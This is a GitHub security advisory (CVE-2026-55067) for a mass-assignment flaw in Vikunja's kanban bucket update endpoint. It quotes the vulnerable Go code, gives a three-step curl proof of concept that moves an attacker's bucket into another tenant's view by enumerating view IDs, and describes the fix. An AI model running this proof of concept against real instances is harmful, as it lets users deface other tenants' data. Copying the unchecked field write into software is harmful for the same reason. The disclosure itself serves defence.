# [M] Vikunja vulnerable to authenticated cross-tenant kanban-bucket relocation via `project_view_id` mass-assignment

## Summary
Severity: Medium
Advisory: GHSA-569v-q83c-3j3g
CVE: CVE-2026-55067
CWE: CWE-639
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:N/I:L/A:N (CVSS_V3)
Published: 2026-08-28
Source: https://github.com/advisories/GHSA-569v-q83c-3j3g
Type: github-advisory

## Affected
- Go: `code.vikunja.io/api` — affected >=0 <2.4.0

## Details
## Summary

`POST /api/v1/projects/{project}/views/{view}/buckets/{bucket}` mass-assigns the request body's `project_view_id` onto the bucket row. The permission check only verifies that the URL-supplied bucket already belongs to the URL-supplied `(project, view)` pair; the body's `project_view_id` is never validated. Any signed-in user can therefore take one of their own buckets and graft it into any other tenant's kanban view, with attacker-controlled title and the attacker's account as `created_by`.

This vulnerability was found using an LLM, and manually verified against latest (2.3.0).

## Vulnerable code

`pkg/models/kanban.go` (lines 348-359):

```go
func (b *Bucket) Update(s *xorm.Session, _ web.Auth) (err error) {
    _, err = s.
        Where("id = ?", b.ID).
        Cols(
            "title",
            "limit",
            "position",
            "project_view_id",   // mass-assigned from the request body
        ).
        Update(b)
    return
}
```

`Bucket.CanUpdate` (`canDoBucket`) only validates that the URL-supplied `{bucket}` belongs to the URL-supplied `{project}/{view}`. The body's `project_view_id` reaches `Update` unchecked and is written through.

## Proof of Concept

**Prerequisites:** Two registered users (`attacker` and `victim`). In the IDs below: attacker's project is `2`, kanban view `8`; victim's project is `1`, kanban view `4`.

**Step 1:** Attacker creates a fresh bucket in their own project.

```bash
curl -s -X PUT 'http://localhost:13456/api/v1/projects/2/views/8/buckets' \
  -H 'Authorization: Bearer <attacker_token>' \
  -H 'Content-Type: application/json' \
  -d '{"title":"PWNED BUCKET"}' | jq '.id'
# Returns: 7
```

**Step 2:** Attacker updates bucket `7`, supplying `project_view_id` = victim's view ID. The URL chain is the attacker's, so `CanUpdate` passes; the body field is written through without further checks.

```bash
curl -s -X POST 'http://localhost:13456/api/v1/projects/2/views/8/buckets/7' \
  -H 'Authorization: Bearer <attacker_token>' \
  -H 'Content-Type: application/json' \
  -d '{"title":"PWNED BUCKET","limit":0,"project_view_id":4}' | jq '{id,title,project_view_id}'
# Returns: {
#   "id": 7,
#   "title": "PWNED BUCKET",
#   "project_view_id": 4
# }
```

**Step 3:** Victim lists buckets in their own view; the attacker's bucket is now there, owned by the attacker.

```bash
curl -s 'http://localhost:13456/api/v1/projects/1/views/4/buckets' \
  -H 'Authorization: Bearer <victim_token>' | jq '[.[]|{id,title,created_by:.created_by.username}]'
# Returns: [
#   {"id":7,"title":"PWNED BUCKET","created_by":"attacker"},
#   {"id":1,"title":"To-Do","created_by":"victim"},
#   {"id":2,"title":"Doing","created_by":"victim"},
#   {"id":3,"title":"Done","created_by":"victim"}
# ]
```

After relocation the attacker can no longer reach the row (it lives in the victim's view), so only the victim can delete the graffiti. `project_view_id` is a sequential integer, so any tenant's view can be targeted by enumeration.

## Impact

Any signed-in user can inject arbitrary-titled buckets into any other tenant's kanban view. Most likely exploitation here would be graffiti/defacement.

## Fix

In `(b *Bucket) Update`, drop `project_view_id` from the `Cols(...)` allowlist (mass-assignment fix) and reject body payloads where `project_view_id != bucket.ProjectViewID`. If legitimate "move bucket between views" is a needed feature, expose it as a dedicated endpoint that calls `CanUpdate` against both the source and destination view.

## References
- https://github.com/go-vikunja/vikunja/security/advisories/GHSA-569v-q83c-3j3g
- https://github.com/go-vikunja/vikunja/pull/3239
- https://github.com/go-vikunja/vikunja/commit/b31d606b8879ebe98fbb2ac5d8b3066b86f59868
- https://github.com/go-vikunja/vikunja
- https://github.com/go-vikunja/vikunja/releases/tag/v2.4.0
